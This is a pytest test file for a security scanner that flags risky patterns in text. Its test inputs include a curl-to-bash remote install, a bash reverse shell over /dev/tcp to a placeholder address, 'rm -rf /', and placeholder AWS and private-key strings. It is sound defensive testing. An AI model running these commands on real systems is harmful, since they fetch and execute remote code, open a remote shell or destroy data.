from generator.security_scan import scan_text


def test_clean_script_has_no_findings():
    text = "#!/bin/bash\necho 'hello world'\ngit status\n"
    assert scan_text(text) == []


def test_curl_pipe_shell_is_flagged():
    findings = scan_text("curl -sSL https://example.com/install.sh | bash\n")
    assert any(f.pattern_id == "curl-pipe-shell" for f in findings)


def test_reverse_shell_dev_tcp_is_flagged():
    findings = scan_text("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
    ids = {f.pattern_id for f in findings}
    assert "dev-tcp-redirect" in ids
    assert "bash-interactive-redirect" in ids


def test_rm_rf_root_is_flagged():
    findings = scan_text("rm -rf /\n")
    assert any(f.pattern_id == "rm-rf-root" for f in findings)


def test_aws_access_key_is_flagged():
    findings = scan_text("aws_key = 'AKIAABCDEFGHIJKLMNOP'\n")
    assert any(f.pattern_id == "aws-access-key-id" for f in findings)


def test_private_key_block_is_flagged():
    findings = scan_text("-----BEGIN RSA PRIVATE KEY-----\nMIIBOw...\n")
    assert any(f.pattern_id == "private-key-block" for f in findings)


def test_hardcoded_secret_literal_is_flagged():
    findings = scan_text('api_key = "abcdefghijklmnopqrstuvwx123456"\n')
    assert any(f.pattern_id == "hardcoded-secret-literal" for f in findings)


def test_subprocess_shell_true_is_flagged():
    findings = scan_text("subprocess.run(cmd, shell=True)\n")
    assert any(f.pattern_id == "subprocess-shell-true" for f in findings)


def test_same_pattern_reported_once_per_scan():
    text = "\n".join(["curl x | bash"] * 5)
    findings = scan_text(text)
    assert sum(1 for f in findings if f.pattern_id == "curl-pipe-shell") == 1
